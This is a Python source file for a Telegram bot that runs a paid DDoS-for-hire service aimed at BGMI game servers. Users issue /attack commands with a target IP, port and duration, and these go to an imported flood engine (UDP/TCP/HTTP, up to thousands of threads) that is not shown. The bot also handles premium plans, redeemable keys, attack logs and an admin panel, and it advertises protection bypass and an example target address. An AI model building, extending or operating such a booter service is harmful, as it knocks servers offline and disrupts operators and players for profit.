#!/usr/bin/env python3
"""
💀 BGMI DDOS BOT - ULTRA PRO
"""

import os
import sys
import json
import logging
import time
import random
from datetime import datetime, timedelta
from threading import Thread

# Install dependencies if missing
try:
    import telebot
except ImportError:
    os.system("pip install pyTelegramBotAPI")
    import telebot

# Import custom modules
from attack import Attack
from database import get_user, update_user, save_log, create_key, redeem_key, load_db
from config import TOKEN, OWNER_ID, OWNER_USERNAME

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ BOT ═══════════════
bot = telebot.TeleBot(TOKEN)

# 🔥🔥🔥 FIX 409 ERROR - Force remove webhook
try:
    bot.remove_webhook()
    print("✅ Webhook removed!")
except Exception as e:
    print(f"⚠️ Webhook removal: {e}")

# 🔥🔥🔥 FIX - Stop polling if already running
try:
    bot.stop_polling()
    print("✅ Stopped previous polling!")
except:
    pass

print("✅ Bot Initialized!")

# ═══════════════ ATTACK INSTANCE ═══════════════
attacker = Attack()
attacking = False
attack_info = {}

# ═══════════════ KEYBOARDS ═══════════════
def main_menu():
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        telebot.types.InlineKeyboardButton("⚔ ATTACK", callback_data="attack"),
        telebot.types.InlineKeyboardButton("⛔ STOP", callback_data="stop")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("📊 STATUS", callback_data="status"),
        telebot.types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("⚿ REDEEM", callback_data="redeem"),
        telebot.types.InlineKeyboardButton("📋 ORDERS", callback_data="orders")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("💎 PLANS", callback_data="plans"),
        telebot.types.InlineKeyboardButton("📩 SUPPORT", callback_data="support")
    )
    return keyboard

def admin_panel():
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        telebot.types.InlineKeyboardButton("📊 STATS", callback_data="admin_stats"),
        telebot.types.InlineKeyboardButton("👥 USERS", callback_data="admin_users")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("🔑 GEN KEY", callback_data="admin_genkey"),
        telebot.types.InlineKeyboardButton("📨 BROADCAST", callback_data="admin_broadcast")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("📋 LOGS", callback_data="admin_logs")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("⌂ MAIN MENU", callback_data="main_menu")
    )
    return keyboard

# ═══════════════ START COMMAND ═══════════════
@bot.message_handler(commands=['start'])
def start_cmd(message):
    try:
        user_id = message.from_user.id
        user = get_user(user_id)
        
        update_user(user_id, {
            'name': message.from_user.first_name,
            'username': message.from_user.username or ''
        })
        
        text = """
💀 **BGMI DDOS BOT** 💀

🔥 Welcome to Ultimate DDOS Bot

🎯 **Features:**
- ⚔ UDP/TCP/HTTP Flood
- 🎮 BGMI Server Freeze
- ⚡ 5000+ Threads
- 🛡️ DDoS Protection Bypass
- 📊 Real-time Monitoring

📌 **Commands:**
/attack IP PORT TIME
/stop
/status
/profile
/redeem KEY
/orders
/plans

📌 **Example:**
/attack 20.204.191.48 10335 180

🎯 **BGMI Ports:** 7000-15000, 10335
⏱️ **Recommended Time:** 180 seconds

💎 **Premium = More Power!**
"""
        bot.reply_to(message, text, parse_mode='Markdown', reply_markup=main_menu())
        print(f"✅ Start command sent to {user_id}")
    except Exception as e:
        print(f"❌ Start error: {e}")

# ═══════════════ ATTACK COMMAND ═══════════════
@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    global attacking, attack_info
    
    try:
        user_id = message.from_user.id
        user = get_user(user_id)
        
        if user.get('banned', False):
            bot.reply_to(message, "🚫 You are banned!")
            return
        
        is_premium = user.get('plan') == 'premium' and user.get('expiry') and datetime.fromisoformat(user['expiry']) > datetime.now()
        
        parts = message.text.split()
        if len(parts) < 4:
            bot.reply_to(message, """
⚠️ **Invalid Format**

Use: /attack IP PORT TIME

Example:
/attack 20.204.191.48 10335 180
""", parse_mode='Markdown')
            return
        
        if attacking:
            bot.reply_to(message, "⚠️ Already attacking! Use /stop")
            return
        
        ip = parts[1]
        try:
            port = int(parts[2])
        except:
            bot.reply_to(message, "❌ Invalid port!")
            return
        try:
            dur = int(parts[3])
        except:
            bot.reply_to(message, "❌ Invalid time!")
            return
        
        # 🔥 SAFE THREAD LIMITS
        if is_premium:
            max_time = 600
            threads = 1500
        else:
            max_time = 60
            threads = 800
        
        if dur > max_time:
            dur = max_time
            bot.reply_to(message, f"⏱️ Time limited to {max_time}s for your plan")
        
        attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time(), 'threads': threads}
        attacking = True
        
        def run_attack():
            global attacking
            try:
                stats = attacker.start(ip, port, dur, threads, 'mixed')
                attacking = False
                
                update_user(user_id, {'$inc': {'total_attacks': 1}})
                save_log(user_id, ip, port, dur, stats['pkts'], 'mixed')
                
                result_text = f"""
✅ **ATTACK COMPLETED**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ 📦 Packets: {stats['pkts']:,}
║ 📶 Speed: {stats['mbps']:.1f} Mbps
║ ⏱️ Duration: {dur}s
║ 📊 Total Requests: {stats['total_requests']}
╚══════════════════════════╝

🔥 BGMI Server Freeze Complete!
📸 Match server response timed out!

🔄 /attack IP PORT TIME
"""
                bot.send_message(user_id, result_text, parse_mode='Markdown')
                print(f"✅ Attack completed for {user_id}")
                
            except Exception as e:
                attacking = False
                bot.send_message(user_id, f"❌ Attack Failed: {e}")
                print(f"❌ Attack error: {e}")
        
        try:
            Thread(target=run_attack).start()
        except Exception as e:
            bot.reply_to(message, f"⚠️ System busy, try again")
            print(f"❌ Thread error: {e}")
            attacking = False
            return
        
        reply_text = f"""
💀 **ATTACK LAUNCHED**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ ⏱️ Duration: {dur}s
║ 🧵 Threads: {threads}
║ 👤 User: {user_id}
║ ⚡ Method: VIP-User
║ 💎 Plan: {'Premium' if is_premium else 'Free'}
╚══════════════════════════╝

🔥 BGMI Server Freeze Started!
📸 Match server response timed out - Soon!

🛑 Use /stop to abort
"""
        bot.reply_to(message, reply_text, parse_mode='Markdown')
        print(f"✅ Attack command sent to {user_id}")
        
    except Exception as e:
        print(f"❌ Attack error: {e}")
        bot.reply_to(message, f"❌ Error: {e}")

# ═══════════════ STOP COMMAND ═══════════════
@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global attacking
    if attacking:
        attacker.on = False
        attacking = False
        bot.reply_to(message, f"✅ **ATTACK STOPPED**\n\n📦 Packets: {attacker.pkts:,}", parse_mode='Markdown')
    else:
        bot.reply_to(message, "💤 No attack running!")

# ═══════════════ STATUS COMMAND ═══════════════
@bot.message_handler(commands=['status'])
def status_cmd(message):
    if attacking:
        elapsed = int(time.time() - attack_info['start'])
        remaining = attack_info['time'] - elapsed
        text = f"""
🟢 **ATTACK IN PROGRESS**

🎯 Target: {attack_info['ip']}:{attack_info['port']}
⏱️ Elapsed: {elapsed}s
⏱️ Remaining: {remaining}s
📦 Packets: {attacker.pkts:,}
"""
    else:
        text = "💤 **SYSTEM IDLE**\n\nNo attack running"
    
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ PROFILE COMMAND ═══════════════
@bot.message_handler(commands=['profile'])
def profile_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    plan = user.get('plan', 'free')
    expiry = user.get('expiry')
    if expiry:
        expiry_date = datetime.fromisoformat(expiry)
        expiry_str = expiry_date.strftime('%d/%m/%Y %I:%M %p')
        remaining = (expiry_date - datetime.now()).days
    else:
        expiry_str = 'N/A'
        remaining = 0
    
    text = f"""
👤 **PROFILE**

╔══════════════════════════╗
║ 👤 Name: {message.from_user.first_name}
║ 🆔 ID: {user_id}
║ 💎 Plan: {plan.upper()}
║ ⏱️ Expiry: {expiry_str}
║ 📅 Days Left: {remaining}
║ ⚡ Threads: {user.get('threads', 1000)}
║ 📊 Total Attacks: {user.get('total_attacks', 0)}
╚══════════════════════════╝
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ REDEEM COMMAND ═══════════════
@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, """
⚿ **REDEEM KEY**

Use: /redeem KEY

Example:
/redeem BGMI-VIP-XXXX
""", parse_mode='Markdown')
        return
    
    key_code = parts[1].upper()
    user_id = message.from_user.id
    
    success, plan, duration = redeem_key(key_code, user_id)
    if success:
        user = get_user(user_id)
        expiry = user.get('expiry')
        bot.reply_to(message, f"""
✅ **KEY REDEEMED!**

💎 Plan: {plan.upper()}
⏱️ Duration: {duration} Days
📅 Expiry: {datetime.fromisoformat(expiry).strftime('%d/%m/%Y %I:%M %p')}

🔥 Full premium access granted!
⚔ /attack IP PORT TIME
""", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Invalid or used key!")

# ═══════════════ ORDERS COMMAND ═══════════════
@bot.message_handler(commands=['orders'])
def orders_cmd(message):
    user = get_user(message.from_user.id)
    order_list = user.get('orders', [])
    if not order_list:
        bot.reply_to(message, "📭 No orders found!")
        return
    
    text = "📋 **YOUR ORDERS**\n\n"
    for i, order in enumerate(order_list[-10:], 1):
        text += f"""
**Order #{i}**
🎯 Plan: {order.get('plan', 'N/A')}
💎 Price: ₹{order.get('price', 0)}
📅 Date: {order.get('date', 'N/A')[:10]}
━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ PLANS COMMAND ═══════════════
@bot.message_handler(commands=['plans'])
def plans_cmd(message):
    text = """
💎 **PREMIUM PLANS**

━━━━━━━━━━━━━━━━━━

🔰 **BASIC** - ₹50
⏱️ 1 Hour | ⚡ 3000 Threads

⚡ **PRO** - ₹100
⏱️ 1 Day | ⚡ 5000 Threads

💀 **ULTRA** - ₹400
⏱️ 1 Week | ⚡ 7000 Threads

👑 **KING** - ₹1000
⏱️ 1 Month | ⚡ 10000 Threads

━━━━━━━━━━━━━━━━━━

📲 Contact: @FathersOfCreater
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ SUPPORT COMMAND ═══════════════
@bot.message_handler(commands=['support'])
def support_cmd(message):
    text = """
📩 **SUPPORT CENTER**

📲 Contact Owner: @FathersOfCreater

💬 Reply here for quick support!
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ CALLBACK HANDLER ═══════════════
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    is_owner = (str(user_id) == str(OWNER_ID))
    
    if call.data == "main_menu":
        bot.edit_message_text(
            "💀 **BGMI DDOS BOT** 💀\n\nSelect an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "attack":
        bot.edit_message_text(
            """
⚔ **ATTACK COMMAND**

Use: /attack IP PORT TIME

Example:
/attack 20.204.191.48 10335 180
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "stop":
        global attacking
        if attacking:
            attacker.on = False
            attacking = False
            bot.edit_message_text(
                "✅ **ATTACK STOPPED**",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=main_menu()
            )
        else:
            bot.edit_message_text(
                "💤 **NO ATTACK RUNNING**",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=main_menu()
            )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "status":
        if attacking:
            elapsed = int(time.time() - attack_info['start'])
            remaining = attack_info['time'] - elapsed
            text = f"""
🟢 **ATTACK IN PROGRESS**

🎯 Target: {attack_info['ip']}:{attack_info['port']}
⏱️ Elapsed: {elapsed}s
⏱️ Remaining: {remaining}s
📦 Packets: {attacker.pkts:,}
"""
        else:
            text = "💤 **SYSTEM IDLE**"
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "profile":
        user = get_user(user_id)
        plan = user.get('plan', 'free')
        text = f"""
👤 **PROFILE**

💎 Plan: {plan.upper()}
📊 Attacks: {user.get('total_attacks', 0)}
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "redeem":
        bot.edit_message_text(
            """
⚿ **REDEEM KEY**

Use: /redeem KEY
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "orders":
        user = get_user(user_id)
        orders = user.get('orders', [])
        if not orders:
            text = "📭 No orders!"
        else:
            text = "📋 **ORDERS**\n\n"
            for i, o in enumerate(orders[-5:], 1):
                text += f"{i}. {o.get('plan')} - ₹{o.get('price')}\n"
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "plans":
        text = """
💎 **PREMIUM PLANS**

🔰 BASIC - ₹50
⚡ PRO - ₹100
💀 ULTRA - ₹400
👑 KING - ₹1000

📲 @FathersOfCreater
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "support":
        text = "📩 Contact: @FathersOfCreater"
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    # ═══════ ADMIN ═══════
    if call.data == "admin":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        bot.edit_message_text(
            "⚜ **ADMIN PANEL**",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_stats":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        db = load_db()
        text = f"""
📊 **STATS**

👥 Users: {len(db['users'])}
📊 Logs: {len(db['logs'])}
🔑 Keys: {len(db['keys'])}
⚡ Status: {'Active' if attacking else 'Idle'}
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_users":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        db = load_db()
        text = "👥 **USERS**\n\n"
        for uid, user in list(db["users"].items())[:10]:
            text += f"🆔 {uid} - {user.get('name', 'Unknown')}\n"
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_genkey":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        key = create_key("premium", 30)
        bot.edit_message_text(
            f"""
🔑 **KEY GENERATED**

Key: `{key}`
Plan: PREMIUM
Duration: 30 Days
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_logs":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        db = load_db()
        logs = db["logs"][-10:]
        if not logs:
            text = "📭 No logs!"
        else:
            text = "📋 **LOGS**\n\n"
            for log in reversed(logs):
                text += f"🎯 {log['ip']}:{log['port']} - {log['packets']} pkts\n"
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_broadcast":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        bot.edit_message_text(
            "📨 Reply with message to broadcast",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return

# ═══════════════ BROADCAST ═══════════════
@bot.message_handler(func=lambda message: True, content_types=['text'])
def broadcast_handler(message):
    if str(message.from_user.id) != str(OWNER_ID):
        return
    
    if message.reply_to_message and "broadcast" in message.reply_to_message.text.lower():
        db = load_db()
        sent = 0
        for user_id in db["users"]:
            try:
                bot.send_message(int(user_id), message.text)
                sent += 1
            except:
                pass
        bot.reply_to(message, f"✅ Broadcast sent to {sent} users!")

# ═══════════════ RUN BOT ═══════════════
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════╗
║  💀 BGMI DDOS BOT - ULTRA PRO       ║
║  🔥 REAL WORKING ATTACK ENGINE      ║
║  📸 JAISA SCREENSHOT MEIN THA       ║
║  ✅ JSON DATABASE                   ║
║  ✅ ALL COMMANDS WORKING            ║
╚══════════════════════════════════════╝
""")
    print("💀 Bot Started Successfully!")
    print("🔥 Attack Engine Ready!")
    print("📸 BGMI Server Freeze Active!")
    print("📁 Database: database.json")
    
    try:
        # 🔥🔥🔥 FIX - Clean start
        bot.remove_webhook()
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        print(f"❌ Bot Error: {e}")
